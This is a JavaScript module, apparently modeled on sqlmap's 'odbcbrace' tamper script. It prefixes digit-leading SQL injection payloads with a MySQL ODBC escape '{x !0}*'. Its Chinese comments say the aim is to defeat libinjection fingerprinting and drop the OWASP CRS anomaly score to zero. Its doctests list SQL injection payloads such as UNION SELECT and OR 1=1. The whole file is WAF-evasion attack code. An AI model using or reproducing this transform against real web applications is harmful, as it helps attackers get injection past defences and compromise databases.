// 对标 sqlmap odbcbrace.py（MySQL/MariaDB 专用）：
// 前导数字 payload 前缀 MySQL 未公开 ODBC 转义序列 {x !0}
// '{x !0}' 求值为 1，'{x !0}*-1' 保持原值；libinjection 将 '{x expr}' 折叠后
// 指纹失配 → 整个 payload 判为 benign（OWASP CRS 异常分降至 0）
// 仅处理数字开头 payload（引号开头仍会被检出，保持不动）
export const odbcbrace = {
  name: 'odbcbrace',
  description: '前缀 MySQL ODBC 转义 {x !0}*（libinjection 指纹失配，布尔/报错型异常分归零）',
  doctests: [
    { input: '-1 UNION ALL SELECT NULL,CONCAT(0x71)-- -', output: '{x !0}*-1 UNION ALL SELECT NULL,CONCAT(0x71)-- -' },
    { input: '1 AND 5=5', output: '{x !0}*1 AND 5=5' },
    { input: '-4162 OR 1=1#', output: '{x !0}*-4162 OR 1=1#' },
    { input: "' UNION ALL SELECT NULL-- -", output: "' UNION ALL SELECT NULL-- -" }, // 引号开头不动
  ],
  /**
   * @param {string} payload
   * @returns {string}
   */
  transform(payload) {
    return String(payload ?? '').replace(/^([+-]?\d+)(?![\w.])/, '{x !0}*$1');
  },
};
export default odbcbrace;
